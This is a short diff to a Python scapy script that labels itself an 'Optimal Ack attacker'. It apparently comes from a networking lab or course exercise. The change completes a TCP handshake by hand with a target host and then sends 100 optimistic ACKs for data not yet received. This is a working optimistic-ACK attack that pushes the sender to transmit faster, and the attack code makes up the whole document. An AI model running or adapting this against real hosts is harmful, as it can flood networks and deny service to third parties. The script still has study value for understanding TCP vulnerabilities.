@@ -4,6 +4,7 @@ This file implements the Optimal Ack attacker.
 """
 
 import argparse
+import time
 from scapy.all import *
 
 parser = argparse.ArgumentParser(
@@ -16,6 +17,22 @@ parser.add_argument('--host', default='127.0.0.1', type=str,
                     help='The ip address to attack.')
 args = parser.parse_args()
 
-packet = IP(dst=args.host) / TCP(sport=args.sport, dport=args.dport,
-                                 flags='S', seq=12345)
-send(packet)
+if __name__ == "__main__":
+    print "Starting three-way handshake..."
+    ip_header = IP(dst=args.host)
+    SEQ=12345
+
+    syn = ip_header / TCP(sport=args.sport, dport=args.dport, flags='S', seq=SEQ)
+    synack = sr1(syn)
+    ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=synack.seq + 1, seq=(SEQ + 1))
+    data = sr1(ack)
+
+    print "First data packet arrived. Sending optimistic acks."
+    data.show()
+
+    OPT_ACK_START = data.seq + 1
+    ACK_SPACING = 1000
+    for i in range(100):
+        opt_ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=(OPT_ACK_START + i * ACK_SPACING), seq=(SEQ + 1))
+        send(opt_ack)
+
